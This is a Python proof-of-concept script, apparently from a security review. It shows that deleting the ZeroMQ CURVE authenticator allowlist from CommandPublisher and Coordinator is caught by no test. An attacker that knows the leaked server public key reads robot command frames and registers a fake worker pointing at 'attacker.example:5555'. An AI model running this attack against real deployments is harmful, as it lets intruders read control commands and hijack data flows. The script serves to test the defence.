"""The ZAP allowlist is only *tested* on one of the three CURVE servers.

tests/security/test_zmq_transport_auth.py has
``test_a_subscriber_with_its_own_keypair_cannot_read_the_state_stream``
for NetworkRelay, and the release notes call the allowlist "part of the
fix, not a refinement of it".  CommandPublisher and Coordinator install
the same allowlist and no test exercises it: deleting
``start_authenticator`` from either leaves all 36 tests green (measured).

This script shows what that undetected deletion would cost.  The
attacker holds the server's CURVE public key -- the same assumption the
relay's own test makes, "assume it leaked" -- and a keypair it generated
itself.  It never holds MADDENING_API_TOKEN.

Run it twice: the allowlist installed (control) and disabled (the state
the surviving mutation produces).
"""
import json, socket, time
import zmq
from maddening.cloud.multigpu.coordinator import Coordinator
from maddening.transport_auth import TransportAuth
from maddening.viz.network import CommandPublisher

TOKEN = "the-shared-token"
COMMAND = {"robot": {"joint_torques": [0.1, -0.2, 0.0]}}


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class _NoopAuth:
    def stop(self): pass


def disable_zap():
    """Exactly what deleting the start_authenticator call does."""
    TransportAuth.start_authenticator = lambda self, ctx: _NoopAuth()


def restore_zap(original):
    TransportAuth.start_authenticator = original


def attacker_socket(ctx, kind, address):
    """Knows the server's public key; brings its own keypair; no token."""
    sock = ctx.socket(kind)
    sock.setsockopt(zmq.LINGER, 0)
    sock.setsockopt(zmq.SNDTIMEO, 500)
    server_public, _ = TransportAuth(token=TOKEN).server_keypair()
    public, secret = zmq.curve_keypair()
    sock.curve_secretkey = secret
    sock.curve_publickey = public
    sock.curve_serverkey = server_public
    if kind == zmq.SUB:
        sock.setsockopt_string(zmq.SUBSCRIBE, "")
    sock.connect(address)
    return sock


def command_channel():
    port = free_port()
    address = f"tcp://127.0.0.1:{port}"
    pub = CommandPublisher(address=address, secure=True, token=TOKEN)
    ctx = zmq.Context()
    sub = attacker_socket(ctx, zmq.SUB, address)
    got = 0
    deadline = time.monotonic() + 4.0
    while time.monotonic() < deadline:
        pub.send(COMMAND)
        try:
            while True:
                sub.recv(zmq.NOBLOCK)
                got += 1
        except zmq.Again:
            pass
        if got:
            break
        time.sleep(0.02)
    sub.close(); ctx.term(); pub.close()
    return got


def coordinator_registration():
    port = free_port()
    address = f"tcp://127.0.0.1:{port}"
    coord = Coordinator(expected_workers=["flow", "structure"],
                        edges=[{"source": "flow", "target": "structure",
                                "source_field": "v", "target_field": "v"}],
                        port=port, bind_host="127.0.0.1",
                        secure=True, token=TOKEN)
    coord.start()
    time.sleep(0.4)
    ctx = zmq.Context()
    sock = attacker_socket(ctx, zmq.DEALER, address)
    deadline = time.monotonic() + 3.0
    while time.monotonic() < deadline:
        try:
            sock.send_multipart([b"", json.dumps({
                "type": "register", "subgraph_id": "flow",
                "address": "attacker.example:5555",
                "zmq_ports": {"state": 5555},
            }).encode()])
        except zmq.Again:
            pass
        time.sleep(0.15)
    registered = dict(coord.registered_workers)
    sock.close(); ctx.term(); coord.shutdown(); time.sleep(1.3)
    return {k: v.address for k, v in registered.items()}


if __name__ == "__main__":
    original = TransportAuth.start_authenticator
    for label, disable in (("ZAP allowlist INSTALLED (shipped)", False),
                           ("ZAP allowlist REMOVED  (surviving mutation)", True)):
        restore_zap(original)
        if disable:
            disable_zap()
        print(f"--- {label}")
        print(f"    command frames the attacker read : {command_channel()}")
        print(f"    coordinator registrations it made: {coordinator_registration()}")
    restore_zap(original)
